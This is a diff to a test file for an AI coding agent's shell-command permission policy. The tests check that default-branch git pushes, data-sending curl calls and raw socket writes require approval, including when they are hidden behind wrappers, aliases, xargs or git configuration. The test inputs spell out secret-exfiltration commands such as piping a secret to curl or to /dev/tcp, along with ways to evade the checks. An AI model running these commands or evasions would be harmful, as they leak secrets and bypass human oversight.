@@ -12,20 +12,32 @@ import {
 	type GitState,
 	allowListIsLocalOnly,
 	everySegmentSafe,
+	isLoopbackOnlyFetch,
 	mustAskReason,
 	networkUse,
 	pushTargetsDefaultBranch,
+	stripPrefix,
 } from "./command-policy";
 import { PermissionManager } from "./index";
 import { _resetTuiApprovalChannel, registerTuiApprovalHandler } from "./tui-approval-channel";
 
 afterAll(cleanupTempDirs);
 
-/** A repository on `current`, whose default branches are main, master and `extra`. */
-function gitOn(current: string | null, extra?: string): GitState {
+/**
+ * A repository on `current`, whose default branches are main, master and
+ * `extra`, with the given git config (key to values) and aliases.
+ */
+function gitOn(
+	current: string | null,
+	extra?: string,
+	config: Record<string, string[]> = {},
+	aliases: Record<string, string> = {},
+): GitState {
 	return {
 		currentBranch: () => current,
 		defaultBranches: () => ["main", "master", ...(extra ? [extra] : [])],
+		config: (key) => config[key] ?? [],
+		aliases: () => aliases,
 	};
 }
 const argv = (s: string) => s.split(" ");
@@ -52,7 +64,9 @@ describe("pushTargetsDefaultBranch", () => {
 	});
 
 	test("the repository's configured default branch counts", () => {
-		expect(pushTargetsDefaultBranch(argv("git push origin trunk"), gitOn("feature", "trunk"))).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin trunk"), gitOn("feature", "trunk"))).toBe(
+			true,
+		);
 	});
 
 	test("a bare push counts only from a default branch", () => {
@@ -72,6 +86,180 @@ describe("pushTargetsDefaultBranch", () => {
 		]) {
 			expect(pushTargetsDefaultBranch(argv(c), gitOn("main"))).toBe(false);
 		}
+	});
+
+	test("partial ref names that resolve to the default branch count", () => {
+		expect(pushTargetsDefaultBranch(argv("git push origin feature:heads/main"), onFeature)).toBe(
+			true,
+		);
+		expect(pushTargetsDefaultBranch(argv("git push origin heads/main"), onFeature)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin feature:heads/feature"), onFeature)).toBe(
+			false,
+		);
+	});
+
+	test("glob refspecs and the matching refspec fail closed", () => {
+		expect(
+			pushTargetsDefaultBranch(argv("git push origin refs/heads/*:refs/heads/*"), onFeature),
+		).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin :"), onFeature)).toBe(true);
+	});
+
+	test("a refspec or remote the shell fills in at run time fails closed", () => {
+		expect(pushTargetsDefaultBranch(argv("git push origin feature:$TARGET"), onFeature)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin HEAD:`cat f`"), onFeature)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push $REMOTE"), onFeature)).toBe(true);
+	});
+
+	test("deleting the default branch counts; a negative refspec alone does not", () => {
+		expect(pushTargetsDefaultBranch(argv("git push origin :main"), onFeature)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin ^refs/heads/main"), onFeature)).toBe(
+			false,
+		);
+	});
+});
+
+describe("pushTargetsDefaultBranch: pushes routed by configuration", () => {
+	test("push.default=upstream with an upstream on the default branch", () => {
+		const g = gitOn("feature", undefined, {
+			"push.default": ["upstream"],
+			"branch.feature.merge": ["refs/heads/main"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), g)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin"), g)).toBe(true);
+	});
+
+	test("push.default=upstream with an upstream on another branch", () => {
+		const g = gitOn("feature", undefined, {
+			"push.default": ["upstream"],
+			"branch.feature.merge": ["refs/heads/feature"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), g)).toBe(false);
+	});
+
+	test("simple and current push the current branch only", () => {
+		for (const mode of ["simple", "current"]) {
+			const g = gitOn("feature", undefined, {
+				"push.default": [mode],
+				"branch.feature.merge": ["refs/heads/main"],
+			});
+			expect(pushTargetsDefaultBranch(argv("git push"), g)).toBe(false);
+		}
+	});
+
+	test("matching and unknown push.default values fail closed; nothing pushes nothing", () => {
+		expect(
+			pushTargetsDefaultBranch(
+				argv("git push"),
+				gitOn("feature", undefined, { "push.default": ["matching"] }),
+			),
+		).toBe(true);
+		expect(
+			pushTargetsDefaultBranch(
+				argv("git push"),
+				gitOn("feature", undefined, { "push.default": ["new-mode"] }),
+			),
+		).toBe(true);
+		expect(
+			pushTargetsDefaultBranch(
+				argv("git push"),
+				gitOn("feature", undefined, { "push.default": ["nothing"] }),
+			),
+		).toBe(false);
+	});
+
+	test("a remote push refspec mapping to the default branch", () => {
+		const g = gitOn("feature", undefined, {
+			"remote.origin.push": ["refs/heads/feature:refs/heads/main"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), g)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git push origin"), g)).toBe(true);
+		// A source with no destination is mapped through the same refspec.
+		expect(pushTargetsDefaultBranch(argv("git push origin feature"), g)).toBe(true);
+		// Another remote has no mapping.
+		expect(pushTargetsDefaultBranch(argv("git push fork"), g)).toBe(false);
+	});
+
+	test("a remote push refspec on HEAD or a glob", () => {
+		const head = gitOn("feature", undefined, { "remote.origin.push": ["HEAD:refs/heads/main"] });
+		expect(pushTargetsDefaultBranch(argv("git push"), head)).toBe(true);
+		const glob = gitOn("feature", undefined, {
+			"remote.origin.push": ["refs/heads/*:refs/heads/*"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), glob)).toBe(true);
+	});
+
+	test("the push remote comes from the branch, then remote.pushDefault", () => {
+		const viaBranch = gitOn("feature", undefined, {
+			"branch.feature.pushRemote": ["up"],
+			"remote.up.push": ["HEAD:main"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), viaBranch)).toBe(true);
+		const viaDefault = gitOn("feature", undefined, {
+			"remote.pushDefault": ["up"],
+			"remote.up.push": ["HEAD:main"],
+		});
+		expect(pushTargetsDefaultBranch(argv("git push"), viaDefault)).toBe(true);
+	});
+
+	test("configuration set on the command line for a push fails closed", () => {
+		expect(
+			pushTargetsDefaultBranch(argv("git -c push.default=matching push"), onFeatureOnly()),
+		).toBe(true);
+		expect(
+			pushTargetsDefaultBranch(argv("git -c remote.origin.push=HEAD:main push"), onFeatureOnly()),
+		).toBe(true);
+		// Configuration unrelated to routing does not.
+		expect(
+			pushTargetsDefaultBranch(
+				argv("git -c core.quotepath=off push origin feature"),
+				onFeatureOnly(),
+			),
+		).toBe(false);
+	});
+});
+
+function onFeatureOnly(): GitState {
+	return gitOn("feature");
+}
+
+describe("pushTargetsDefaultBranch: aliases", () => {
+	test("an alias defined on the command line always counts", () => {
+		expect(
+			pushTargetsDefaultBranch(argv("git -c alias.x=push x origin main"), onFeatureOnly()),
+		).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git -c alias.x=status x"), onFeatureOnly())).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git --config-env=alias.x=VAR x"), onFeatureOnly())).toBe(
+			true,
+		);
+	});
+
+	test("a configured alias for push is resolved and its target checked", () => {
+		const g = gitOn("feature", undefined, {}, { p: "push", pm: "push origin main", ship: "p" });
+		expect(pushTargetsDefaultBranch(argv("git p origin main"), g)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git p origin feature"), g)).toBe(false);
+		expect(pushTargetsDefaultBranch(argv("git pm"), g)).toBe(true);
+		// An alias of an alias.
+		expect(pushTargetsDefaultBranch(argv("git ship origin main"), g)).toBe(true);
+		// Alias names are case-insensitive.
+		expect(pushTargetsDefaultBranch(argv("git P origin main"), g)).toBe(true);
+	});
+
+	test("a shell alias that can reach push fails closed; one that cannot does not", () => {
+		const g = gitOn(
+			"feature",
+			undefined,
+			{},
+			{ up: "!git push", p: "push", up2: "!f() { git p; }; f", st: "!git status" },
+		);
+		expect(pushTargetsDefaultBranch(argv("git up"), g)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git up2"), g)).toBe(true);
+		expect(pushTargetsDefaultBranch(argv("git st"), g)).toBe(false);
+	});
+
+	test("an alias for something else is not a push", () => {
+		const g = gitOn("feature", undefined, {}, { co: "checkout" });
+		expect(pushTargetsDefaultBranch(argv("git co main"), g)).toBe(false);
 	});
 });
 
@@ -116,13 +304,106 @@ describe("networkUse", () => {
 		expect(networkUse(argv("cat file"))).toBeNull();
 		expect(networkUse(argv("gh repo view"))).toBeNull();
 	});
+
+	test("an output file name attached to -o is not read as send flags", () => {
+		expect(networkUse(argv("curl -odata.json https://x"))).toBe("fetch");
+		expect(networkUse(argv("curl -sSoFT.txt https://x"))).toBe("fetch");
+		// A send flag before the value-taking option still counts.
+		expect(networkUse(argv("curl -do x https://x"))).toBe("send");
+	});
+});
+
+describe("isLoopbackOnlyFetch", () => {
+	test("plain fetches of this machine", () => {
+		for (const c of [
+			"curl http://localhost:3000/health",
+			"curl -s http://127.0.0.1:8080/",
+			"curl -fsS http://[::1]:9000/status",
+			"curl localhost:3000",
+			"curl -s -o out.json -H Accept:application/json http://localhost/api",
+			"curl --max-time 5 --url http://127.0.0.1/",
+		]) {
+			expect(isLoopbackOnlyFetch(argv(c))).toBe(true);
+		}
+	});
+
+	test("anything that could send data or leave the machine is not exempt", () => {
+		for (const c of [
+			"curl https://example.com",
+			"curl http://localhost/ https://example.com",
+			"curl -d x=1 http://localhost/",
+			"curl -T f http://localhost/",
+			"curl -X POST http://localhost/",
+			"curl -L http://localhost/",
+			"curl -x http://proxy:8080 http://localhost/",
+			"curl --resolve localhost:80:10.0.0.1 http://localhost/",
+			"curl --connect-to localhost:80:example.com:80 http://localhost/",
+			"curl -K cfg http://localhost/",
+			"curl http://localhost@example.com/",
+			"curl http://localhost.example.com/",
+			"curl http://localhost{,.example.com}/",
+			"curl http://$HOST/",
+			"curl -s",
+			"wget http://localhost/",
+		]) {
+			expect(isLoopbackOnlyFetch(argv(c))).toBe(false);
+		}
+	});
+});
+
+describe("stripPrefix: wrappers", () => {
+	const run = (s: string) => stripPrefix(argv(s))?.argv.join(" ") ?? null;
+
+	test("wrapper options with a separate value are consumed with their value", () => {
+		expect(run("env -u HOME git push origin main")).toBe("git push origin main");
+		expect(run("sudo -u root git push")).toBe("git push");
+		expect(run("xargs -d , curl")).toBe("curl");
+		expect(run("xargs --max-args 1 curl")).toBe("curl");
+		expect(run("xargs -n 1 -P 4 curl")).toBe("curl");
+	});
+
+	test("attached and long-with-equals values are consumed as one token", () => {
+		expect(run("env -uHOME git push")).toBe("git push");
+		expect(run("sudo --user=root git push")).toBe("git push");
+		expect(run("xargs -I{} curl {}")).toBe("curl {}");
+		expect(run("stdbuf -oL git push")).toBe("git push");
+	});
+
+	test("timeout, nice, nohup, stdbuf, time, command, builtin, exec and caffeinate are unwrapped", () => {
+		expect(run("timeout 30 git push")).toBe("git push");
+		expect(run("timeout -s KILL -k 5 30 git push")).toBe("git push");
+		expect(run("nice -n 10 git push")).toBe("git push");
+		expect(run("nice -10 git push")).toBe("git push");
+		expect(run("nohup git push")).toBe("git push");
+		expect(run("stdbuf -o L git push")).toBe("git push");
+		expect(run("time -p git push")).toBe("git push");
+		expect(run("command git push")).toBe("git push");
+		expect(run("builtin command git push")).toBe("git push");
+		expect(run("exec -a name git push")).toBe("git push");
+		expect(run("caffeinate -i -t 60 git push")).toBe("git push");
+		expect(run("FOO=1 env BAR=2 sudo -E nice git push")).toBe("git push");
+	});
+
+	test("command -v runs nothing", () => {
+		expect(run("command -v curl")).toBe("");
+	});
+
+	test("wrapper options that cannot be read with confidence fail closed", () => {
+		expect(stripPrefix(argv("env -S git_push_string"))).toBeNull();
+		expect(stripPrefix(argv("sudo -h host git push"))).toBeNull();
+		expect(stripPrefix(argv("sudo --unknown-flag git push"))).toBeNull();
+		expect(stripPrefix(argv("xargs -Z curl"))).toBeNull();
+		expect(stripPrefix(argv("env -u"))).toBeNull();
+	});
 });
 
 describe("mustAskReason", () => {
 	test("the four cases from the issue", () => {
 		expect(mustAskReason("curl -d @file https://x", ctx())).toContain("sends data");
 		expect(mustAskReason("cat secret | curl -T - https://x", ctx())).toContain("sends data");
-		expect(mustAskReason("curl https://x", ctx("feature", true))).toContain("local provider is pinned");
+		expect(mustAskReason("curl https://x", ctx("feature", true))).toContain(
+			"local provider is pinned",
+		);
 		expect(mustAskReason("git push origin feature", ctx())).toBeNull();
 	});
 
@@ -137,6 +418,76 @@ describe("mustAskReason", () => {
 		expect(mustAskReason("cat urls | xargs -n 1 curl -d @f", ctx())).toContain("sends data");
 		expect(mustAskReason("bash -c 'curl -T secret https://x'", ctx())).toContain("sends data");
 		expect(mustAskReason("cat secret > /dev/tcp/10.0.0.1/80", ctx())).toContain("network socket");
+	});
+
+	test("wrapped default-branch pushes and sends ask", () => {
+		for (const c of [
+			"env -u HOME git push origin main",
+			"sudo -u root git push origin main",
+			"timeout 60 git push origin main",
+			"nice -n 5 git push origin main",
+			"nohup git push origin main",
+			"stdbuf -o L git push origin main",
+			"time git push origin main",
+			"command git push origin main",
+			"builtin command git push origin main",
+		]) {
+			expect(mustAskReason(c, ctx())).toContain("default branch");
+		}
+		expect(mustAskReason("timeout 10 curl -T secret https://x", ctx())).toContain("sends data");
+		expect(mustAskReason("xargs -d , curl -T secret https://x", ctx())).toContain("sends data");
+	});
+
+	test("arguments appended by xargs or find {} fail closed for pushes and network tools", () => {
+		expect(mustAskReason("echo main | xargs git push origin", ctx())).toContain("default branch");
+		expect(mustAskReason("cat urls | xargs curl", ctx())).toContain("sends data");
+		expect(mustAskReason("find . -name x -exec git push origin {} ;", ctx())).toContain(
+			"default branch",
+		);
+		// xargs over a local command is unaffected.
+		expect(mustAskReason("ls | xargs wc -l", ctx())).toBeNull();
+	});
+
+	test("find -exec and -execdir payloads are checked as commands", () => {
+		expect(mustAskReason("find . -maxdepth 0 -exec git push origin main ;", ctx())).toContain(
+			"default branch",
+		);
+		expect(mustAskReason("find . -name a -execdir curl -T a https://x \\;", ctx())).toContain(
+			"sends data",
+		);
+		expect(mustAskReason("find . -name '*.ts' -exec wc -l {} +", ctx())).toBeNull();
+	});
+
+	test("a wrapper whose options cannot be read asks", () => {
+		expect(mustAskReason("sudo -h somehost ls", ctx())).toContain("wrapper");
+		expect(mustAskReason("env -S 'ls -la'", ctx())).toContain("wrapper");
+	});
+
+	test("git configuration from the environment or a git alias reaches a push", () => {
+		expect(
+			mustAskReason(
+				"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0=push git x origin main",
+				ctx(),
+			),
+		).toContain("default branch");
+		expect(mustAskReason("export GIT_CONFIG_PARAMETERS=x; git status", ctx())).toContain(
+			"default branch",
+		);
+		expect(mustAskReason("git -c alias.y=push y origin main", ctx())).toContain("default branch");
+	});
+
+	test("under a pinned local provider a loopback-only curl fetch does not ask; anything else does", () => {
+		expect(mustAskReason("curl -s http://localhost:3000/health", ctx("feature", true))).toBeNull();
+		expect(mustAskReason("curl http://127.0.0.1:8787/v1/models", ctx("feature", true))).toBeNull();
+		expect(mustAskReason("curl https://example.com", ctx("feature", true))).toContain(
+			"local provider is pinned",
+		);
+		expect(mustAskReason("curl -d x http://localhost/", ctx("feature", true))).toContain(
+			"sends data",
+		);
+		expect(mustAskReason("wget http://localhost/", ctx("feature", true))).toContain(
+			"local provider is pinned",
+		);
 	});
 
 	test("a plain fetch with no pinned local provider and ordinary commands do not ask", () => {
@@ -234,13 +585,19 @@ describe("requestPermission with no terminal (#3748)", () => {
 		process.env.EIGHT_HEADLESS = "1";
 		const pm = manager();
 		pm.setAutoApprove(true);
-		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(false);
-		expect(await pm.requestPermission("Execute Shell Command", "d", "curl -d @file https://x")).toBe(false);
+		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(
+			false,
+		);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "curl -d @file https://x"),
+		).toBe(false);
 		expect(
 			await pm.requestPermission("Execute Shell Command", "d", "cat secret | curl -T - https://x"),
 		).toBe(false);
 		// A push to another branch keeps today's behaviour.
-		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin feature")).toBe(true);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "git push origin feature"),
+		).toBe(true);
 	});
 
 	test("refuses a plain fetch under a pinned local provider", async () => {
@@ -248,6 +605,73 @@ describe("requestPermission with no terminal (#3748)", () => {
 		const pm = manager();
 		pm.setPinnedLocalProvider(true);
 		expect(await pm.requestPermission("Execute Shell Command", "d", "curl https://x")).toBe(false);
+	});
+
+	test("with a local-only allow list, a loopback curl fetch still runs; other network commands are refused", async () => {
+		process.env.EIGHT_HEADLESS = "1";
+		process.env.EIGHT_PROVIDERS_ALLOW = "8gent,ollama";
+		const pm = manager();
+		expect(
+			await pm.requestPermission(
+				"Execute Shell Command",
+				"d",
+				"curl -fsS http://127.0.0.1:18789/health",
+			),
+		).toBe(true);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "curl -s http://localhost:3000/"),
+		).toBe(true);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "curl -s http://[::1]:3000/"),
+		).toBe(true);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "curl https://example.com"),
+		).toBe(false);
+		expect(
+			await pm.requestPermission(
+				"Execute Shell Command",
+				"d",
+				"curl -d x=1 http://localhost:3000/",
+			),
+		).toBe(false);
+	});
+
+	test("refuses wrapped and configuration-routed default-branch pushes", async () => {
+		process.env.EIGHT_HEADLESS = "1";
+		const dir = tempDir("cmd-policy-");
+		const pm = new PermissionManager(path.join(dir, "permissions.json"));
+		pm.setGitState(
+			gitOn("feature", undefined, {
+				"push.default": ["upstream"],
+				"branch.feature.merge": ["refs/heads/main"],
+			}),
+		);
+		pm.setAutoApprove(true);
+		expect(await pm.requestPermission("Execute Shell Command", "d", "git push")).toBe(false);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "env -u HOME git push origin main"),
+		).toBe(false);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "timeout 60 git push origin main"),
+		).toBe(false);
+	});
+});
+
+describe("Infinite mode (#3748)", () => {
+	// Infinite mode does not apply these checks; decision pending. This test pins
+	// today's behaviour so a change is a deliberate decision, not a side effect.
+	test("does not apply the ask-every-time checks", async () => {
+		process.env.EIGHT_HEADLESS = "1";
+		const pm = manager();
+		pm.enableInfiniteMode();
+		try {
+			expect(pm.checkPermission("git push origin main")).toBe("allowed");
+			expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(
+				true,
+			);
+		} finally {
+			pm.disableInfiniteMode();
+		}
 	});
 });
 
@@ -261,11 +685,17 @@ describe("requestPermission in a terminal (#3748)", () => {
 		});
 		const pm = manager();
 		pm.setAutoApprove(true);
-		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(true);
+		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(
+			true,
+		);
 		// Approving once does not stop the next one from asking.
-		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(true);
+		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin main")).toBe(
+			true,
+		);
 		// A push to another branch is not asked about.
-		expect(await pm.requestPermission("Execute Shell Command", "d", "git push origin feature")).toBe(true);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "git push origin feature"),
+		).toBe(true);
 		expect(asked).toEqual(["git push origin main", "git push origin main"]);
 	});
 
@@ -273,6 +703,8 @@ describe("requestPermission in a terminal (#3748)", () => {
 		(process.stdin as { isTTY?: boolean }).isTTY = true;
 		registerTuiApprovalHandler(async () => "deny");
 		const pm = manager();
-		expect(await pm.requestPermission("Execute Shell Command", "d", "curl -d @file https://x")).toBe(false);
+		expect(
+			await pm.requestPermission("Execute Shell Command", "d", "curl -d @file https://x"),
+		).toBe(false);
 	});
 });
